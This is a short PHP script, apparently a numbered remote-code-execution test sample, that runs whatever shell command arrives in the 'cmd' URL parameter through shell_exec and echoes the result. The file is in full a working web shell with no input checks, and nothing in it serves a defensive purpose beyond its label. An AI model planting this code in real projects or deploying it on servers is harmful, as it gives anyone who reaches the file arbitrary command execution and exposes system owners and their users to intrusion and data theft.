<?php
// RCE test variation #656
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>